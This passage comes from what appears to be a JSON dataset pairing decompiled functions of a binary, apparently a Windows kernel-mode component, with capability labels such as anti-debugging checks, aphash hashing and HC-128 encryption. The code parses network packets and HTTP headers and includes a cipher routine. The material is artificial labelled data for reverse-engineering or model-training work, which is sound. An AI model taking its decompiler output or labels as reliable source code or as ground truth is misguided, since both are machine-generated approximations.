fcn.0005a2c4(arg1, &uStack104, iVar1 == 0);\n    return iVar1;\n}\n",
        "token_count": 758
    },
    "00034fe4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.00034fe4(ulong arg1, uint32_t *arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uint in_stack_00000038;\n    ulong in_stack_ffffffffffffff50;\n    uint uVar2;\n    uint uStack136;\n    int32_t iStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uchar auStack112 [16];\n    uchar auStack96 [4];\n    uint32_t uStack92;\n    uint uStack72;\n    int32_t iStack68;\n    \n    uVar2 = in_stack_ffffffffffffff50 >> 0x20;\n    uStack128 = 0;\n    uStack124 = 0;\n    uStack120 = 0;\n    if (*0x7f908 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else if (*0x7f928 == 0) {\n        uStack124 = arg1;\n        uVar1 = (**0x7f910)(&uStack128, auStack96);\n        if (uVar1 == 0) {\n            uStack136 = arg1;\n            if ((iStack68 == 3) || (uStack136 = uStack72,  iStack68 == 4)) {\n                uVar1 = fcn.000333b0(uStack92, arg2);\n                if ((uVar1 == 0) && (uVar1 = fcn.00032e88(*arg2, arg4, in_stack_00000028),  uVar1 == 0)) {\n                    uVar1 = fcn.00034e60(uStack92, arg3);\n                    iStack132 = uVar1;\n                    if (iStack132 == 0) {\n                        uVar1 = fcn.000668d2(*0x7f950, 0, 0, 0, auStack112, CONCAT44(uVar2, 0x12003c), &uStack136, 8, \n                                             in_stack_00000030, in_stack_00000038);\n                    }\n                }\n            }\n            else {\n                uVar1 = 0xc0000350;\n            }\n        }\n    }\n    else {\n        uVar1 = fcn.00034810(arg1, arg2, arg3, arg4);\n    }\n    return uVar1;\n}\n",
        "token_count": 545
    },
    "00041ab4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.00041ab4(ulong arg1, uint16_t *arg2, ulong arg3, uint16_t *arg4)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    ushort uVar5;\n    bool bVar6;\n    bool bVar7;\n    uint32_t *puVar8;\n    int16_t iVar9;\n    uint16_t uVar10;\n    int16_t iVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint64_t uVar16;\n    uint16_t *puVar17;\n    uint16_t *puVar18;\n    uint8_t *arg1_00;\n    char *pcVar19;\n    uint32_t auStackX32 [2];\n    uint32_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    ulong uStack240;\n    uint uStack232;\n    uint uStack228;\n    uchar uStack224;\n    uint8_t uStack223;\n    ushort uStack222;\n    uint32_t *puStack216;\n    uint16_t *puStack208;\n    uint8_t *puStack200;\n    uint8_t *puStack192;\n    uint64_t uStack184;\n    uint16_t *puStack176;\n    ulong uStack168;\n    ulong uStack160;\n    ulong uStack152;\n    ulong uStack144;\n    ushort uStack136;\n    ushort uStack134;\n    uint16_t *puStack128;\n    uint8_t *puStack120;\n    char *pcStack112;\n    uint8_t *puStack104;\n    char acStack96 [32];\n    \n    bVar7 = false;\n    bVar6 = false;\n    pcStack112 = NULL;\n    uStack184 = uStack184 & 0xffffffff00000000;\n    puStack176 = NULL;\n    puStack192 = NULL;\n    puStack200 = NULL;\n    puStack120 = NULL;\n    puStack208 = NULL;\n    puStack104 = NULL;\n    uVar15 = 0;\n    puStack216 = NULL;\n    if (arg2 == NULL) {\n        if (in_stack_00000028 < 0xe) {\n            return 0;\n        }\n        in_stack_00000028 = in_stack_00000028 - 0xe;\n        puVar18 = arg4 + 7;\n        uStack240 = arg4;\n    }\n    else {\n        puVar18 = arg4;\n        uStack240 = arg2;\n        if (arg3 != 0xe) {\n            return 0;\n        }\n    }\n    puStack128 = arg4;\n    iVar9 = fcn.00030df4();\n    puVar17 = uStack240;\n    iVar12 = fcn.00066020(arg1, uStack240, uStack240, in_stack_00000028);\n    if (iVar12 != 0) {\n        return 0;\n    }\n    if (iVar9 == 0x800) {\n        if (in_stack_00000028 < 0x14) {\n            return 1;\n        }\n        puStack176 = puVar18;\n        uVar10 = fcn.00030df4();\n        uVar3 = *puVar18;\n        uVar13 = (uVar3 & 0xf) * 4;\n        if (uVar13 < 0x14) {\n            return 1;\n        }\n        if (uVar10 < uVar13) {\n            return 1;\n        }\n        puVar17 = puVar18 + 10;\n        uVar14 = puVar18[9] + puVar18[8] + puVar18[7] + puVar18[6] + puVar18[5] + puVar18[4] + puVar18[2] + puVar18[1] +\n                 puVar18[3] + *puVar18;\n        for (iVar12 = uVar13 - 0x14; iVar12 != 0; iVar12 = iVar12 + -4) {\n            uVar4 = *puVar17;\n            puVar1 = puVar17 + 1;\n            puVar17 = puVar17 + 2;\n            uVar14 = uVar14 + uVar4 + *puVar1;\n        }\n        iVar12 = (uVar14 >> 0x10) + (uVar14 & 0xffff);\n        if ((iVar12 >> 0x10) + iVar12 != -1) {\n            return 1;\n        }\n        if (in_stack_00000030 == 0) {\n            if (uVar10 < 0x2e) {\n                if (in_stack_00000028 < uVar10) {\n                    return 1;\n                }\n            }\n            else if (uVar10 != in_stack_00000028) {\n                return 1;\n            }\n            if (in_stack_00000028 != uVar10) {\n                in_stack_00000028 = uVar10;\n            }\n        }\n        uVar10 = fcn.00030df4();\n        if ((uVar10 & 0x1fff) != 0) {\n            return 1;\n        }\n        if ((uVar10 >> 0xd & 1) != 0) {\n            return 1;\n        }\n        arg1_00 = puVar18 + uVar13;\n        in_stack_00000028 = in_stack_00000028 + (uVar3 & 0xf) * -4;\n        auStackX32[0]._0_1_ = *(puStack176 + 9);\n        puVar18 = puStack176;\ncode_r0x00041d93:\n        uVar16 = in_stack_00000028;\n        if (auStackX32[0] == 1) {\n            if (iVar9 != 0x800) {\n                return 1;\n            }\n            if (in_stack_00000028 < 4) {\n                return 1;\n            }\n            puStack120 = arg1_00;\n            if ((in_stack_00000030 == 0) && (iVar9 = fcn.00041240(arg1_00, uVar16),  iVar9 != 0)) {\n                return 1;\n            }\n            puStack216 = arg1_00 + 4;\n            if (in_stack_00000028 - 4 < 0x1b) {\n                return 1;\n            }\n            uVar14 = fcn.00030dc8(*puStack216);\n            uVar13 = fcn.00044764();\n            if (uVar13 == 0) {\n                if ((0x1a < in_stack_00000028 - 8) &&\n                   (puStack216 = arg1_00 + 8,  uVar14 = fcn.00030dc8(*(arg1_00 + 8)),  uVar14 < 0)) {\n                    uVar13 = fcn.00044764();\n                    if (uVar13 == 0) {\n                        return 1;\n                    }\ncode_r0x00042334:\n                    bVar6 = false;\n                    bVar7 = true;\n                    if (in_stack_00000030 == 0) {\n                        *(arg1_00 + 4) = 0;\n                    }\n                }\n            }\n            else if (uVar14 < 0) {\n                bVar7 = true;\n                bVar6 = false;\n            }\n            goto code_r0x00042365;\n        }\n        uVar14 = 0;\n        if (auStackX32[0] == 6) {\n            if (in_stack_00000028 < 0x14) {\n                return 1;\n            }\n            uVar3 = arg1_00[0xc];\n            puStack192 = arg1_00;\n            if (in_stack_00000030 == 0) {\n                if (iVar9 == 0x800) {\n                    uStack232 = *(puVar18 + 6);\n                    uStack224 = 0;\n                    uStack228 = *(puVar18 + 8);\n                    uStack223 = *(puVar18 + 9);\n                    uStack222 = fcn.00030df4(uVar16 & 0xffff);\n                    iVar11 = fcn.00040bc8(&uStack232, arg1_00, uVar16);\n                }\n                else {\n                    uStack136 = 0x600;\n                    uStack168 = *(puStack208 + 4);\n                    uStack160 = *(puStack208 + 8);\n                    uStack152 = *(puStack208 + 0xc);\n                    uStack144 = *(puStack208 + 0x10);\n                    uStack134 = fcn.00030df4(uStack168, uStack152, uVar16 & 0xffff);\n                    iVar11 = fcn.00040d50(&uStack168, arg1_00, uVar16);\n                }\n                if (iVar11 != 0) {\n                    return 1;\n                }\n            }\n            if ((iVar9 == 0x800) && (iVar12 = fcn.000660a4(arg1, uStack240, puVar18, arg1_00),  iVar12 != 0)) {\n                return 0;\n            }\n            if ((puStack192[0xd] & 0xef) == 0) {\n                return 1;\n            }\n            if (in_stack_00000028 - (uVar3 >> 2 & 0x3c) < 0x17) {\n                return 1;\n            }\n            uVar13 = fcn.00044764();\n            if (uVar13 != 0) goto code_r0x0004236e;\n            goto code_r0x00042365;\n        }\n        if (auStackX32[0] != 0x11) {\n            if (auStackX32[0] != 0x3a) goto code_r0x00041bc3;\n            if (iVar9 != -0x7923) {\n                return 1;\n            }\n            if (in_stack_00000028 < 8) {\n                return 1;\n            }\n            puStack104 = arg1_00;\n            if (in_stack_00000030 == 0) {\n                uStack168 = *(puStack208 + 4);\n                uStack160 = *(puStack208 + 8);\n                uStack152 = *(puStack208 + 0xc);\n                uStack144 = *(puStack208 + 0x10);\n                uStack134 = fcn.00030df4(uStack168, uStack152, 0x3a);\n                uStack136 = fcn.00030df4(uVar16 & 0xffff);\n                iVar9 = fcn.0004136c(&uStack168, arg1_00, uVar16);\n                if (iVar9 != 0) {\n                    return 1;\n                }\n            }\n            puStack216 = arg1_00 + 8;\n            if (in_stack_00000028 - 8 < 0x1b) {\n                return 1;\n            }\n            uVar14 = fcn.00030dc8(*puStack216);\n            uVar13 = fcn.00044764();\n            if (uVar13 == 0) {\n                if (0x1a < in_stack_00000028 - 0xc) {\n                    uVar13 = fcn.00044764();\n                    if (uVar13 == 0) {\n                        return 1;\n                    }\n                    if (uVar14 < 0) {\n                        bVar7 = true;\n                        bVar6 = false;\n                        if (in_stack_00000030 == 0) {\n                            *(arg1_00 + 4) = 0;\n                        }\n                        *(arg1_00 + 0xc) = 0;\n                    }\n                }\n            }\n            else if (uVar14 < 0) goto code_r0x00042334;\n            goto code_r0x00042365;\n        }\n        if (in_stack_00000028 < 8) {\n            return 1;\n        }\n        puStack200 = arg1_00;\n        if (in_stack_00000030 == 0) {\n            uVar5 = *(arg1_00 + 4);\n            if (iVar9 == 0x800) {\n                uStack232 = *(puVar18 + 6);\n                uStack224 = 0;\n                uStack228 = *(puVar18 + 8);\n                uStack223 = *(puVar18 + 9);\n                uStack222 = uVar5;\n                if (*(arg1_00 + 6) == 0) {\ncode_r0x00041fcb:\n                    iVar11 = 0;\n                }\n                else {\n                    uVar10 = fcn.00030df4();\n                    iVar11 = fcn.000410e0(&uStack232, arg1_00, uVar10);\n                }\n            }\n            else {\n                uStack136 = 0x1100;\n                uStack168 = *(puStack208 + 4);\n                uStack160 = *(puStack208 + 8);\n                uStack152 = *(puStack208 + 0xc);\n                uStack144 = *(puStack208 + 0x10);\n                uStack134 = uVar5;\n                if (*(arg1_00 + 6) == 0) goto code_r0x00041fcb;\n                uVar10 = fcn.00030df4(uStack168, uStack152);\n                iVar11 = fcn.00040f2c(&uStack168, arg1_00, uVar10);\n            }\n            if (iVar11 != 0) {\n                return 1;\n            }\n        }\n        if ((iVar9 != -0x7923) && (iVar12 = fcn.0006613c(arg1, uStack240, puVar18, arg1_00),  iVar12 != 0)) {\n            return 0;\n        }\n        uVar13 = 0;\n        if ((in_stack_00000028 - 8 < 0x17) || (uVar13 = fcn.00044764(),  uVar15 = 0,  uVar13 == 0)) {\n            iVar9 = fcn.00030df4();\n            if (iVar9 == 0x35) {\n                iVar12 = fcn.00059a04(arg1_00 + 8, in_stack_00000028 - 8, &uStack240, acStack96);\n                if (iVar12 == 0) {\n                    return 1;\n                }\n                if (auStackX32[0] == 0) {\n                    uStack184 = uStack240._4_1_ & 0x1f;\n                    bVar7 = true;\n                    bVar6 = false;\n                    uVar15 = uStack240._3_1_;\n                }\n                else {\n                    uVar16 = 0xffffffffffffffff;\n                    pcVar19 = acStack96;\n                    do {\n                        if (uVar16 == 0) break;\n                        uVar16 = uVar16 - 1;\n                        cVar2 = *pcVar19;\n                        pcVar19 = pcVar19 + 1;\n                    } while (cVar2 != '\\0');\n                    bVar7 = false;\n                    bVar6 = true;\n                    uStack184 = ~uVar16 - 1;\n                    uVar15 = 0;\n                }\n                pcStack112 = acStack96;\n                uVar13 = 8;\n                if (!bVar7) goto code_r0x0004236e;\n                if (in_stack_00000030 != 0) goto code_r0x000424f7;\n                *(arg1_00 + 8) = uVar15;\n                uVar13 = 8;\n                uVar14 = uVar15;\n            }\n            goto code_r0x00042365;\n        }\n    }\n    else {\n        if (iVar9 == -0x7923) {\n            if (in_stack_00000028 < 0x28) {\n                return 1;\n            }\n            puStack208 = puVar18;\n            uVar10 = fcn.00030df4(puVar18[2]);\n            if (in_stack_00000028 != uVar10 + 0x28) {\n                return 1;\n            }\n            if ((in_stack_00000030 == 0) && (uVar10 + 0x28 < 0x2e)) {\n                return 1;\n            }\n            in_stack_00000028 = in_stack_00000028 - 0x28;\n            auStackX32[0] = auStackX32[0] & 0xffffff00 | *(puStack208 + 3);\n            uVar13 = fcn.000415d4(puVar18 + 0x14, puVar17 & 0xffffffffffffff00 | *(puStack208 + 3), in_stack_00000028, \n                                  auStackX32);\n            if (uVar13 != 0) {\n                return 1;\n            }\n            arg1_00 = puVar18 + 0x14 + uVar13;\n            puVar18 = NULL;\n            goto code_r0x00041d93;\n        }\ncode_r0x00041bc3:\n        if (in_stack_00000028 < 0x17) {\n            return 1;\n        }\n        uVar13 = fcn.00044764();\n        uVar14 = 0;\n        if (uVar13 == 0) {\n            return 1;\n        }\ncode_r0x00042365:\n        uVar15 = uVar14;\n        if (uVar13 == 0) {\n            return 1;\n        }\n    }\ncode_r0x0004236e:\n    puVar8 = puStack216;\n    if (in_stack_00000030 == 0) {\n        if (!bVar6) {\n            if (puStack176 != NULL) {\n                puStack176[1] = 0;\n                puStack176[2] = 0;\n                puStack176[3] = 0;\n                *(puStack176 + 4) = 0;\n                puStack176[5] = 0;\n            }\n            if (puStack208 != NULL) {\n                puStack208[2] = 0;\n                *(puStack208 + 7) = 0;\n                if ((bVar7) && (puStack216 != NULL)) {\n                    uVar14 = fcn.00030dc8(uVar15 & 0x9fffffff);\n                    *puVar8 = uVar14;\n                }\n            }\n            if (puStack104 != NULL) {\n                *(puStack104 + 2) = 0;\n                *(puStack104 + 4) = 0;\n            }\n            if (puStack192 != NULL) {\n                *(puStack192 + 8) = 0;\n                *(puStack192 + 4) = 0;\n                *(puStack192 + 0x10) = 0;\n                puStack192[0xc] = 0;\n                puStack192[0xd] = 0;\n                *(puStack192 + 0xe) = 0;\n                *(puStack192 + 0x12) = 0;\n            }\n            if (puStack200 != NULL) {\n                *(puStack200 + 6) = 0;\n                *(puStack200 + 4) = 0;\n            }\n            if (((puStack120 != NULL) && (*(puStack120 + 2) = 0,  bVar7)) && (puVar8 != NULL)) {\n                uVar15 = fcn.00030dc8(uVar15 & 0x9fffffff);\n                *puVar8 = uVar15;\n            }\n        }\n        fcn.00041694(arg1, arg2, arg3, puStack128);\n    }\n    if (uVar13 == 0) {\n        return 1;\n    }\ncode_r0x000424f7:\n    if (bVar6) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 4427
    },
    "000432b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.000432b4(int32_t *arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint64_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    char *arg1_00;\n    uint64_t uVar9;\n    int32_t iVar10;\n    uint64_t uVar11;\n    bool bVar12;\n    ulong in_stack_00000028;\n    uint64_t *in_stack_00000030;\n    uint *in_stack_00000038;\n    \n    for (; (*arg1 == '\\n' || ((*arg1 == '\\r' && (*(arg1 + 1) == '\\n')))); arg1 = arg1 + 1) {\n        arg2 = arg2 + -1;\n    }\n    iVar6 = fcn.000668de(arg1, 10, arg2);\n    if (iVar6 == 0) {\n        return 0;\n    }\n    iVar10 = arg1;\n    uVar3 = iVar6 - iVar10;\n    iVar6 = uVar3 + 1;\n    uVar11 = uVar3;\n    if ((uVar3 != 0) && (*((uVar3 - 1) + arg1) == '\\r')) {\n        uVar11 = uVar11 - 1;\n    }\n    if (uVar11 < 0xe) {\n        return 0;\n    }\n    iVar7 = fcn.000668de(arg1);\n    if (iVar7 == 0) {\n        return 0;\n    }\n    uVar3 = iVar7 - iVar10;\n    uVar9 = uVar3;\n    if (uVar3 == 0) {\n        return 0;\n    }\n    if (uVar9 == 3) {\n        bVar12 = *arg1 < *0x157d8;\n        if ((*arg1 == *0x157d8) && (bVar12 = *(arg1 + 2) < *0x157da,  *(arg1 + 2) == *0x157da)) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (1 - bVar12) - (bVar12 != 0);\n        }\n        if (iVar4 == 0) goto code_r0x00043395;\n    }\n    if (uVar9 != 4) {\n        return 0;\n    }\n    if (*arg1 != *0x157d0) {\n        return 0;\n    }\ncode_r0x00043395:\n    iVar7 = uVar9 + 1;\n    puVar1 = arg1 + iVar7;\n    iVar8 = fcn.000668de(puVar1, 0x20, arg2 - iVar7);\n    if (iVar8 == 0) {\n        return 0;\n    }\n    uVar3 = (iVar8 - iVar7) - iVar10;\n    if (uVar3 == 0) {\n        return 0;\n    }\n    if (*puVar1 != '/') {\n        if (uVar3 < 8) {\n            return 0;\n        }\n        bVar12 = *puVar1 < *0x157c8;\n        if (((*puVar1 == *0x157c8) && (bVar12 = *(puVar1 + 1) < *0x157cc,  *(puVar1 + 1) == *0x157cc)) &&\n           (bVar12 = *(puVar1 + 6) < *0x157ce,  *(puVar1 + 6) == *0x157ce)) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (1 - bVar12) - (bVar12 != 0);\n        }\n        if (iVar4 != 0) {\n            return 0;\n        }\n    }\n    iVar7 = uVar3 + 1 + iVar7;\n    if (uVar11 - iVar7 != 8) {\n        return 0;\n    }\n    puVar1 = iVar7 + arg1;\n    bVar12 = *puVar1 < *0x157c0;\n    if ((*puVar1 == *0x157c0) && (bVar12 = *(puVar1 + 1) < *0x157c4,  *(puVar1 + 1) == *0x157c4)) {\n        iVar4 = 0;\n    }\n    else {\n        iVar4 = (1 - bVar12) - (bVar12 != 0);\n    }\n    if (iVar4 != 0) {\n        return 0;\n    }\n    if (*(puVar1 + 6) != '.') {\n        return 0;\n    }\n    arg1_00 = iVar6 + arg1;\n    iVar4 = fcn.0005c3bc(arg1_00, arg2 - iVar6, in_stack_00000028, arg3);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if (in_stack_00000030 == NULL) {\n        if (in_stack_00000038 == NULL) {\n            return 1;\n        }\n    }\n    else {\n        *in_stack_00000030 = 0;\n    }\n    if (in_stack_00000038 != NULL) {\n        *in_stack_00000038 = 0;\n    }\n    do {\n        iVar7 = fcn.000668de(arg1_00, 10);\n        if (iVar7 == 0) {\n            return 1;\n        }\n        iVar7 = (iVar7 - iVar10) + 1;\n        puVar2 = iVar6 + arg1;\n        iVar8 = fcn.000668de(puVar2);\n        if (iVar8 == 0) {\n            return 1;\n        }\n        iVar4 = (iVar8 - iVar6) - iVar10;\n        if ((in_stack_00000030 == NULL) || (iVar4 != 0xe)) {\ncode_r0x00043565:\n            if ((in_stack_00000038 != NULL) && (iVar4 == 10)) {\n                bVar12 = *puVar2 < str.Connection._0_8_;\n                if ((*puVar2 == str.Connection._0_8_) &&\n                   (bVar12 = *(puVar2 + 1) < str.Connection._8_2_,  *(puVar2 + 1) == str.Connection._8_2_)) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = (1 - bVar12) - (bVar12 != 0);\n                }\n                if (iVar4 == 0) {\n                    bVar12 = *(iVar8 + 2) < *0x157b8;\n                    if ((*(iVar8 + 2) != *0x157b8) || (bVar12 = *(iVar8 + 6) < *0x157bc,  *(iVar8 + 6) != *0x157bc)) {\n                        iVar4 = (1 - bVar12) - (bVar12 != 0);\n                    }\n                    if (iVar4 == 0) {\n                        *in_stack_00000038 = 1;\n                    }\n                }\n            }\n        }\n        else {\n            bVar12 = *puVar2 < str.Content_Length._0_8_;\n            if ((*puVar2 == str.Content_Length._0_8_) &&\n               ((bVar12 = *(puVar2 + 1) < str.Content_Length._8_4_,  *(puVar2 + 1) == str.Content_Length._8_4_ &&\n                (bVar12 = *(puVar2 + 0xc) < str.Content_Length._12_2_,  *(puVar2 + 0xc) == str.Content_Length._12_2_))))\n            {\n                iVar5 = 0;\n            }\n            else {\n                iVar5 = (1 - bVar12) - (bVar12 != 0);\n            }\n            if (iVar5 != 0) goto code_r0x00043565;\n            uVar3 = fcn.00031248(iVar8 + 2, 0, 0);\n            *in_stack_00000030 = uVar3;\n        }\n        arg1_00 = iVar7 + arg1;\n        iVar6 = iVar7;\n    } while( true );\n}\n",
        "token_count": 1857
    },
    "00044764": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t fcn.00044764(ulong param_1, ulong param_2)\n\n{\n    int32_t iVar1;\n    int32_t iStackX24;\n    uint32_t uStackX28;\n    \n    iVar1 = fcn.00032a5c(param_1, param_2, &iStackX24);\n    if ((iVar1 != 0) && (iStackX24 == *0x6b500)) {\n        if (uStackX28 == 0xc001ba5e) {\n            return 1;\n        }\n        if (uStackX28 < 4) {\n            return uStackX28 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 154
    },
    "00020130": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00020130(uint64_t *arg1, ulong arg2, char *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint64_t auStackX24 [2];\n    uint32_t in_stack_00000028;\n    uchar auStack184 [144];\n    \n    if (arg2 < 8) {\n        auStackX24[0] = 0;\n        fcn.0006670a(auStackX24, arg1, arg2);\n    }\n    else {\n        auStackX24[0] = *arg1;\n    }\n    auStackX24[0] = auStackX24[0] & 0xffffffff00000000 | auStackX24[0] ^ in_stack_00000028;\n    if (in_stack_00000028 != 0) {\n        fcn.0002d030(auStack184, arg2, arg1);\n        fcn.0002ca20(arg4, arg3 + 1, in_stack_00000028, auStack184);\n    }\n    iVar1 = (-((in_stack_00000028 & 7) != 0) & 8) + (in_stack_00000028 & 0xfffffff8);\n    *arg3 = iVar1 - in_stack_00000028;\n    return iVar1 + 1;\n}\n",
        "token_count": 306
    },
    "00020328": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nint32_t fcn.00020328(ulong noname_0, ulong noname_1, ulong arg3)\n\n{\n    return (arg3 + 7U & 0xfffffff8) + 1;\n}\n",
        "token_count": 49
    },
    "0002ca20": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.0002ca20(uint8_t *arg1, uchar *arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint8_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    uint8_t *puStack96;\n    uint8_t *puStack88;\n    \n    uVar2 = 0;\n    if (in_stack_00000030 == 0) {\n        iVar3 = arg3 - 8;\n        uVar1 = *in_stack_00000028 << 0x18 | in_stack_00000028[1] << 0x10 | in_stack_00000028[2] << 8 |\n                in_stack_00000028[3];\n        uVar2 = in_stack_00000028[4] << 0x18 | in_stack_00000028[5] << 0x10 | in_stack_00000028[6] << 8 |\n                in_stack_00000028[7];\n        puStack88 = in_stack_00000028;\n        if (-1 < iVar3) {\n            uVar9 = arg3 >> 3;\n            iVar3 = iVar3 + (arg3 >> 3) * -8;\n            uVar8 = uVar1;\n            uVar10 = uVar2;\n            puStack96 = uVar9;\n            do {\n                puVar4 = arg1 + 4;\n                uVar1 = *arg1 << 0x18 | arg1[1] << 0x10 | arg1[2] << 8 | arg1[3];\n                puVar5 = arg1 + 5;\n                puVar6 = arg1 + 6;\n                puVar7 = arg1 + 7;\n                arg1 = arg1 + 8;\n                uVar2 = *puVar4 << 0x18 | *puVar5 << 0x10 | *puVar6 << 8 | *puVar7;\n                uStack104 = uVar1;\n                uStack100 = uVar2;\n                fcn.0002c514(&uStack104, arg4);\n                uVar8 = uVar8 ^ uStack104;\n                uVar10 = uVar10 ^ uStack100;\n                *arg2 = uVar8 >> 0x18;\n                arg2[1] = uVar8 >> 0x10;\n                arg2[2] = uVar8 >> 8;\n                arg2[3] = uVar8;\n                arg2[4] = uVar10 >> 0x18;\n                arg2[5] = uVar10 >> 0x10;\n                arg2[6] = uVar10 >> 8;\n                arg2[7] = uVar10;\n                arg2 = arg2 + 8;\n                uVar9 = uVar9 - 1;\n                in_stack_00000028 = puStack88;\n                uVar8 = uVar1;\n                uVar10 = uVar2;\n            } while (uVar9 != 0);\n        }\n        uVar8 = uVar1;\n        uVar10 = uVar2;\n        if (iVar3 != -8) {\n            uVar8 = *arg1 << 0x18 | arg1[1] << 0x10 | arg1[2] << 8 | arg1[3];\n            uVar10 = arg1[4] << 0x18 | arg1[5] << 0x10 | CONCAT11(arg1[6], arg1[7]);\n            uStack104 = uVar8;\n            uStack100 = uVar10;\n            fcn.0002c514(&uStack104, arg4);\n            uVar1 = uVar1 ^ uStack104;\n            uVar2 = uVar2 ^ uStack100;\n            arg2 = arg2 + (iVar3 + 8);\n            if (iVar3 != -7) {\n                if (iVar3 != -6) {\n                    if (iVar3 != -5) {\n                        if (iVar3 != -4) {\n                            if (iVar3 != -3) {\n                                if (iVar3 != -2) {\n                                    if (iVar3 != -1) {\n                                        if (iVar3 != 0) goto code_r0x0002cfc9;\n                                        arg2 = arg2 + -1;\n                                        *arg2 = uVar2;\n                                    }\n                                    arg2 = arg2 + -1;\n                                    *arg2 = uVar2 >> 8;\n                                }\n                                arg2 = arg2 + -1;\n                                *arg2 = uVar2 >> 0x10;\n                            }\n                            arg2 = arg2 + -1;\n                            *arg2 = uVar2 >> 0x18;\n                        }\n                        arg2 = arg2 + -1;\n                        *arg2 = uVar1;\n                    }\n                    arg2 = arg2 + -1;\n                    *arg2 = uVar1 >> 8;\n                }\n                arg2 = arg2 + -1;\n                *arg2 = uVar1 >> 0x10;\n            }\n            arg2[-1] = uVar1 >> 0x18;\n        }\ncode_r0x0002cfc9:\n        *in_stack_00000028 = uVar8 >> 0x18;\n        in_stack_00000028[1] = uVar8 >> 0x10;\n        in_stack_00000028[2] = uVar8 >> 8;\n        in_stack_00000028[3] = uVar8;\n        in_stack_00000028[4] = uVar10 >> 0x18;\n        in_stack_00000028[5] = uVar10 >> 0x10;\n        in_stack_00000028[6] = uVar10 >> 8;\n        in_stack_00000028[7] = uVar10;\n        return;\n    }\n    iVar3 = arg3 - 8;\n    uStack104 = *in_stack_00000028 << 0x18 | in_stack_00000028[1] << 0x10 | in_stack_00000028[2] << 8 |\n                in_stack_00000028[3];\n    uStack100 = in_stack_00000028[4] << 0x18 | in_stack_00000028[5] << 0x10 | in_stack_00000028[6] << 8 |\n                in_stack_00000028[7];\n    puStack96 = in_stack_00000028;\n    if (-1 < iVar3) {\n        uVar9 = arg3 >> 3;\n        iVar3 = iVar3 + (arg3 >> 3) * -8;\n        do {\n            puVar4 = arg1 + 4;\n            puVar5 = arg1 + 5;\n            puVar6 = arg1 + 6;\n            uStack104 = (*arg1 << 0x18 | arg1[1] << 0x10 | arg1[2] << 8 | arg1[3]) ^ uStack104;\n            puVar7 = arg1 + 7;\n            arg1 = arg1 + 8;\n            uStack100 = (*puVar4 << 0x18 | *puVar5 << 0x10 | *puVar6 << 8 | *puVar7) ^ uStack100;\n            fcn.0002c014(&uStack104, arg4);\n            *arg2 = uStack104 >> 0x18;\n            arg2[1] = uStack104 >> 0x10;\n            arg2[2] = uStack104 >> 8;\n            arg2[3] = uStack104;\n            arg2[4] = uStack100 >> 0x18;\n            arg2[5] = uStack100 >> 0x10;\n            arg2[6] = uStack100 >> 8;\n            arg2[7] = uStack100;\n            arg2 = arg2 + 8;\n            uVar9 = uVar9 - 1;\n            in_stack_00000028 = puStack96;\n        } while (uVar9 != 0);\n    }\n    if (iVar3 == -8) goto code_r0x0002ccde;\n    uVar1 = 0;\n    arg1 = arg1 + (iVar3 + 8);\n    if (iVar3 == -7) {\ncode_r0x0002cc5a:\n        uVar1 = uVar1 | arg1[-1] << 0x18;\n    }\n    else {\n        if (iVar3 == -6) {\ncode_r0x0002cc4d:\n            arg1 = arg1 + -1;\n            uVar1 = uVar1 | *arg1 << 0x10;\n            goto code_r0x0002cc5a;\n        }\n        if (iVar3 == -5) {\ncode_r0x0002cc40:\n            arg1 = arg1 + -1;\n            uVar1 = uVar1 | *arg1 << 8;\n            goto code_r0x0002cc4d;\n        }\n        if (iVar3 == -4) {\ncode_r0x0002cc38:\n            arg1 = arg1 + -1;\n            uVar1 = *arg1;\n            goto 